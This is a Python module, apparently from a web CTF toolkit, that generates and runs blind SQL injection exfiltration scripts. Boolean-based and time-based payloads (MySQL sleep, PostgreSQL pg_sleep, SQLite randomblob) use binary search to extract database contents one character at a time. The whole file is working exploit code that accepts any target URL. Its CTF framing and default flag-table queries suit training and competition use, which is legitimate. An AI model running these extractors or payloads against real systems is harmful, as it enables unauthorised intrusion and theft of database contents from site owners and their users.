"""
Blind Exfiltration Engine & Python Script Generator for Web CTF challenges.
Supports Boolean-based and Time-based Blind SQLi / SSTI char-by-char binary search extraction.
"""

import time
import string
import requests
from typing import Optional, Callable
from rich.progress import Progress, SpinnerColumn, TextColumn
from core.ui import console, print_success, print_info, print_warning, print_error, print_flag
from core.utils import find_flags

CHARSET = string.ascii_letters + string.digits + "{}_-!@#$?=+~ "

def generate_boolean_blind_script(
    url: str,
    method: str = "GET",
    param_name: str = "id",
    success_needle: str = "Welcome",
    query_to_extract: str = "(SELECT flag FROM flag_table LIMIT 1)"
) -> str:
    """Generate a standalone Python script for Boolean-based Blind SQLi."""
    return f"""#!/usr/bin/env python3
import requests
import string
import sys

URL = "{url}"
NEEDLE = "{success_needle}"
CHARSET = string.ascii_letters + string.digits + "{{}}_-!@#$?=+~ "

session = requests.Session()
session.headers.update({{"User-Agent": "CTF-Blind-Solver/1.0"}})

def check_condition(payload_condition):
    # Adjust payload wrapper according to target vulnerability
    # e.g. admin' AND ({{condition}})-- -
    test_payload = f"1' AND ({{payload_condition}})-- -"
    
    if "{method.upper()}" == "GET":
        resp = session.get(URL, params={{"{param_name}": test_payload}})
    else:
        resp = session.post(URL, data={{"{param_name}": test_payload}})
        
    return NEEDLE in resp.text

def extract_data():
    print("[*] Starting Boolean Blind Extraction...")
    extracted = ""
    pos = 1
    
    while True:
        # Binary Search on ASCII value
        low = 32
        high = 126
        found_char = None
        
        while low <= high:
            mid = (low + high) // 2
            # Check if ASCII value is > mid
            condition = f"ASCII(SUBSTR({query_to_extract}, {{pos}}, 1)) > {{mid}}"
            if check_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
                
        # Check candidate character
        candidate_ascii = low
        if candidate_ascii < 32 or candidate_ascii > 126:
            # End of string or null
            break
            
        char_condition = f"ASCII(SUBSTR({query_to_extract}, {{pos}}, 1)) = {{candidate_ascii}}"
        if check_condition(char_condition):
            found_char = chr(candidate_ascii)
            extracted += found_char
            sys.stdout.write(found_char)
            sys.stdout.flush()
            pos += 1
        else:
            break
            
    print(f"\\n[+] Extraction Complete: {{extracted}}")
    return extracted

if __name__ == "__main__":
    extract_data()
"""

def generate_time_blind_script(
    url: str,
    method: str = "GET",
    param_name: str = "id",
    sleep_time: int = 3,
    query_to_extract: str = "(SELECT flag FROM flags LIMIT 1)"
) -> str:
    """Generate a standalone Python script for Time-based Blind SQLi."""
    return f"""#!/usr/bin/env python3
import requests
import string
import time
import sys

URL = "{url}"
SLEEP_TIME = {sleep_time}
CHARSET = string.ascii_letters + string.digits + "{{}}_-!@#$?=+~ "

session = requests.Session()
session.headers.update({{"User-Agent": "CTF-Time-Solver/1.0"}})

def check_time_condition(payload_condition):
    # MySQL: IF(condition, sleep(3), 0)
    # PostgreSQL: (CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END)
    # SQLite: (CASE WHEN condition THEN randomblob(100000000) ELSE 0 END)
    test_payload = f"1' AND (IF({{payload_condition}}, sleep({{SLEEP_TIME}}), 0))-- -"
    
    start = time.time()
    try:
        if "{method.upper()}" == "GET":
            session.get(URL, params={{"{param_name}": test_payload}}, timeout=SLEEP_TIME + 5)
        else:
            session.post(URL, data={{"{param_name}": test_payload}}, timeout=SLEEP_TIME + 5)
    except requests.exceptions.Timeout:
        return True
        
    duration = time.time() - start
    return duration >= SLEEP_TIME - 0.5

def extract_data():
    print("[*] Starting Time-Based Blind Extraction...")
    extracted = ""
    pos = 1
    
    while True:
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTR({query_to_extract}, {{pos}}, 1)) > {{mid}}"
            if check_time_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
                
        candidate = low
        if check_time_condition(f"ASCII(SUBSTR({query_to_extract}, {{pos}}, 1)) = {{candidate}}"):
            found_char = chr(candidate)
            extracted += found_char
            sys.stdout.write(found_char)
            sys.stdout.flush()
            pos += 1
        else:
            break
            
    print(f"\\n[+] Extraction Complete: {{extracted}}")
    return extracted

if __name__ == "__main__":
    extract_data()
"""

def live_boolean_exfiltrate(
    url: str,
    method: str,
    param: str,
    needle: str,
    query: str,
    max_len: int = 64
) -> str:
    """Run live Boolean Blind SQLi character extraction inside WebCTF CLI."""
    session = requests.Session()
    session.headers.update({"User-Agent": "WebCTF-Exfiltrator/1.0"})
    
    extracted = ""
    print_info(f"Target URL: {url}")
    print_info(f"Query: {query}")
    print_info(f"Success Needle: '{needle}'")
    
    def test_cond(cond: str) -> bool:
        payload = f"1' AND ({cond})-- -"
        try:
            if method.upper() == "GET":
                r = session.get(url, params={param: payload}, timeout=10)
            else:
                r = session.post(url, data={param: payload}, timeout=10)
            return needle in r.text
        except Exception as e:
            return False

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task(f"[cyan]Extracting...[/cyan] {extracted}", total=max_len)
        
        for pos in range(1, max_len + 1):
            low = 32
            high = 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTR({query}, {pos}, 1)) > {mid}"
                if test_cond(cond):
                    low = mid + 1
                else:
                    high = mid - 1
            
            candidate = low
            if 32 <= candidate <= 126 and test_cond(f"ASCII(SUBSTR({query}, {pos}, 1)) = {candidate}"):
                extracted += chr(candidate)
                progress.update(task, description=f"[green]Extracted:[/green] [bold yellow]{extracted}[/bold yellow]", advance=1)
                flags = find_flags(extracted)
                if flags:
                    print_flag(flags[0])
                    break
            else:
                break
                
    print_success(f"Result: {extracted}")
    return extracted
